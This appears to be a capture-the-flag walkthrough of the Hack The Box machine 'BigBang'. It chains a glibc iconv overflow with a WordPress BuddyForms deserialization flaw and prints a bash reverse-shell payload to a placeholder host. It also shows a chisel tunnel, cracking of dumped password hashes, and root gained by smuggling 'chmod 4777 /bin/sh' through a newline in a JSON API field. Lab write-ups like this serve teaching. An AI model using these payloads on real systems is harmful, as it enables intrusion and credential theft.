@@ -1,0 +1,286 @@
+---
+title: BigBang
+date: '2025-01-29'
+description: >-
+  BigBang is an high-level hackmyvm  HTB machine that runs WordPress with known
+  vulnerabilities ,like CNEXT (CVE-2024-2961) and CVE-2023-26326
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - Hard
+  - HTB
+  - LINUX
+cover: /mc/uploads/2025/02/COVER_2-4.webp
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this walkthrough, we'll explore the steps to compromise the Backfire (bigbang) machine on Hack The Box. We'll cover enumeration, vulnerability discovery,exploitation, and privilege escalation. Let's dive in!
+
+## enumerate with Nmap :
+
+We start by running an **Nmap** scan to identify open services. This helps us map out potential entry points:
+
+```bash
+$ nmap -sV 10.10.11.53 -T5
+Host is up (0.15s latency).
+Not shown: 850 closed tcp ports (reset), 148 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.62
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.43 seconds
+```
+The output reveals two key open ports:
+
+- **Port 22:** OpenSSH 8.9
+- **Port 80:** Apache 2.4.62
+
+## enumerate directories
+
+Next, we use **Gobuster** to enumerate directories on the web server. This step helps us uncover directories that may not be immediately visible:
+
+```bash
+$ gobuster dir -u http://blog.bigbang.htb/ -w ~/SecLists/Discovery/Web-Content/common.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 281]
+/.htaccess            (Status: 403) [Size: 281]
+/.hta                 (Status: 403) [Size: 281]
+/index.php            (Status: 301) [Size: 0] [--> http://blog.bigbang.htb/]
+/server-status        (Status: 403) [Size: 281]
+/wp-admin             (Status: 301) [Size: 323] [--> http://blog.bigbang.htb/wp-admin/]
+/wp-content           (Status: 301) [Size: 325] [--> http://blog.bigbang.htb/wp-content/]
+/wp-includes          (Status: 301) [Size: 326] [--> http://blog.bigbang.htb/wp-includes/]
+Progress: 4735 / 4736 (99.98%)
+/xmlrpc.php           (Status: 405) [Size: 42]
+===============================================================
+```
+It appears that the target is running **WordPress**, so we can use WPScan for further enumeration.
+
+```bash
+$ wpscan --url http://blog.bigbang.htb --enumerate u,tt,vp,ap  --plugins-version-detection aggressive
+
+[+] URL: http://blog.bigbang.htb/ [10.10.11.52]
+[+] PHP/8.3.2
+[i] Plugin(s) Identified:
+[+] buddyforms
+ | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
+ | Last Updated: 2025-01-30T02:58:00.000Z
+ | [!] The version is out of date, the latest version is 2.8.15
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 2.7.7 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt
+[i] User(s) Identified:
+[+] root
+[+] shawking
+```
+so that the information we got , we have 2 users , and a vulnerable plugin and the version of the PHP 8.3.2
+
+Researching the vulnerabilities, we identified:  
+**CNEXT (CVE-2024-2961)**  
+**CVE-2023-26326**
+
+## Vulnerability Exploitation
+
+*CVE-2024-2961*: Buffer Overflow in glibc's iconv() Function  
+this vulnerability can be exploited to achieve remote code execution. By crafting a malicious payload that triggers the buffer overflow in the `iconv()` function, an attacker can manipulate the PHP engine's memory, leading to arbitrary code execution for more information you can visit ""  
+*CVE-2023-26326*: Unauthenticated Insecure Deserialization in WordPress BuddyForms Plugin  
+The BuddyForms plugin for WordPress, prior to version 2.7.8, suffers from an unauthenticated insecure deserialization vulnerability. An attacker can exploit this flaw by leveraging the PHP Archive (PHAR) stream wrapper. By uploading a malicious PHAR file and accessing it through a crafted URL, the attacker can trigger the deserialization of untrusted data.
+
+so we can combine these vulrebilities and gain access to the machine
+
+To ensure the exploit works, you need a version of `glibc` before the patched release. The affected versions are:
+
+- glibc 2.39 and older
+
+Using **glibc 2.36** , before exploiting the vulnerabilty , we need to download some libraries
+
+- pwntools
+- ten
+
+start a listener and build a enviremnent to avoid the collision of dependecies
+
+so after combining the both of payload , the results will be like this :  
+(on this script) [cnext\_payload](https://nutzh.top/payload/cnext_payload/)
+
+```bash
+$ python3 exploit.py  http://blog.bigbang.htb/wp-admin/admin-ajax.php  'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
+[*] Potential heaps: 0x7f10e4a00040, 0x7f10e4800040, 0x7f10e3200040, 0x7f10e0c00040, 0x7f10df800040 (using last one)
+HEAP address: 0x7f10e4a00040
+LIBC address: 0x7f10e7759000
+Sending exploit...
+```
+After execution, we establish a reverse shell as `www-data`.
+
+```bash
+$ nc -vlnp {port}
+bash: cannot set terminal process group (1): Inappropriate ioctl for device 
+bash: no job control in this shell
+www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$
+```
+## Database Access via Chisel
+
+After gaining access, we examine the **wp-config.php** file and retrieve database credentials:
+
+```bash
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'wp_user' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'wp_password' );
+
+/** Database hostname */
+define( 'DB_HOST', '172.17.0.1' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+```
+so we gonna use chisel
+
+We use **Chisel** to port forward and access the database locally:  
+Start a local server:
+
+```bash
+kali@kali$ chisel server -p {port} --reverse
+```
+and in the target machine we gonna start the chisel client
+
+```bash
+./chisel client {your_IP}:{port} R:3306:172.17.0.1:3306
+```
+so we gonna connect to the server and forward the traffic from the port 3306 on the target machine to the database server at 172.17.0.1:3306
+
+Connect to the database on our machine :
+
+```bash
+$ mysql -u wp_user -p -h 127.0.0.1 -P 3306
+Enter password: #wp_password
+```
+after connecting we gonna interact with the wordpress in sqlite with "use wordpress" after we gonna show all the tables with "show tables;" and the last is "SELECT \* From wp\_users;" and we gonna get the shawing and root hashed password
+
+| ID | user\_login | user\_pass |
+|---|---|---|
+| 1 | root | $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 |
+| 3 | shawking | $P$Br7LUHG9NXXXXXXXXXXXXXXXXX |
+
+Crack the password using Hashcat.   
+ ssh to the user shawking and grep the User flag
+
+## Privelage escalation
+
+### Exploiting Grafana
+
+Grafana is running on `127.0.0.1:3000`. Using `linpeas.sh`, we extract its SQLite database and open it:
+
+```bash
+sqlitebrowser grafana.db
+```
+so we got the password of the admin and the developer
+
+| Username | Email | Name | Password Hash | Salt |
+|---|---|---|---|---|
+| admin | admin@localhost |  | 441a715bd788e92817XXXXXXXXXXXX | CFn7zMsQpf |
+| developer | ghubble@bigbang.htb | George Hubble | 7e8018a4210efbaeb12f011XXXX | 4umebBJucv |
+
+so when looking how to decrypt i see that Grafana uses PBKDF2-SHA256 for passwords so i used the tool [Grafana2Hashcat](https://github.com/iamaldi/grafana2hashcat) .  
+Crack the password with `grafana2hashcat.py`:
+
+```bash
+$ python3 grafana2hashcat.py  grafan.txt -o decode.txt
+
+[+] Grafana2Hashcat
+[+] Reading Grafana hashes from:  grafan.txt
+[+] Done! Read 1 hashes in total.
+[+] Converting hashes...
+[+] Converting hashes complete.
+[+] Writing output to 'decode.txt' file.
+[+] Now, you can run Hashcat with the following command, for example:
+
+hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
+```
+Login as `developer`:
+
+```bash
+shawking@bigbang:~$ su developer
+password: 
+developer@bigbang:~/android$ ls
+satellite-app.apk
+```
+Found a running service `app.bigbang.htb:9090`. Decompiling the APK file using `jadx` to analyze its contents:
+
+```bash
+$ jadx -d {destination_output}  path/to/satellite-app.apk
+```
+After looking through the files, I found that there is a service running on app.bigbang.htb:9090. We will now investigate the available endpoints.
+
+```bash
+$ grep -rE "app.bigbang.htb:9090/" .
+sources/q0/b.java:            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/command").openConnection();
+sources/u/AsyncTaskC0228f.java:                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/login").openConnection();
+sources/u/AsyncTaskC0228f.java:                    HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/command").openConnection();
+```
+so we found 2 endpoints
+
+- http://app.bigbang.htb:9090/command
+- http://app.bigbang.htb:9090/login
+
+authenticate as developer :
+
+```bash
+developer@bigbang:~$ curl -X POST http://127.0.0.1:9090/login -d '{"username":"developer","password":"bigbang"}' -H "Content-type:application/json"
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODkwMzc1NSwianRpIjoiNGM1YThlZWUtN2YwNi00OTllLTliYzYtMmZhY2E3MWY4MDIzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODkwMzc1NSwiY3NyZiI6IjJkNjViNWE3LWJjOGItNDY4YS05MmE3LWJjMGI3NTZhNTc0MSIsImV4cCI6MTczODkwNzM1NX0.L-lzgHnewzH2KI3sM0UWz_bb4ejGEoEF71dkD5Drisg"}
+```
+after having the token to access we can interacat with the endpoint /command
+
+after searching on files i found that there is a two command we can interact with the endpoit
+
+- "move"
+- "send\_image"
+
+so i tried to inject some character on the move command "move" but it doesnt work but it works for "send\_image"
+
+```bash
+developer@bigbang:~$ curl -Post http://127.0.0.1:9090/command -H "Content-type:application/json" -H "Authorization: Bearer " -d '{"command":"send_image","output_file":"\n /etc/passwd"}'
+{"error":"Error generating image: /bin/sh: 2: /etc/passwd: Permission denied\n"}
+```
+the output means that the command is executed with the shell so we gonna try to modify the permission of the /bin/sh or /bin/bash , adding the setuid (`+s`) bit to grant the developer root privileges:
+
+```bash
+developer@bigbang:~$ curl -Post http://127.0.0.1:9090/command -H "Content-type:application/json" -H "Authorization: Bearer " -d '{"command":"send_image","output_file":"\nchmod 4777 /bin/sh"}'
+{"error":"Error reading image file: [Errno 2] No such file or directory: '\\nchmod 4777 /bin/sh'"}
+developer@bigbang:~$ ls -l /bin/sh
+lrwxrwxrwx 1 root root 4 Mar 23  2022 /bin/sh -> dash
+```
+Execute as root:
+
+```bash
+developer@bigbang:~$ /bin/sh -p 
+# whoami
+root
+```
+**Root Access Achieved!**
+
+**GG**
+
+## Key Takeaways
+
+- **Combining multiple vulnerabilities (CVE-2024-2961 and CVE-2023-26326) can lead to privilege escalation.**
+- **Decompiling APK files with `jadx` helps identify hidden services and endpoints.**
+- **Port forwarding with `chisel` allows access to internal services from an external machine.**
+- **Exploiting insecure deserialization and RCE vulnerabilities in web applications can provide system access.**
+- **Modifying `/bin/sh` with the `+s` bit enables execution with elevated privileges, making privilege escalation easier.**
+- **Using `/bin/sh -p` preserves root privileges when executing commands.**
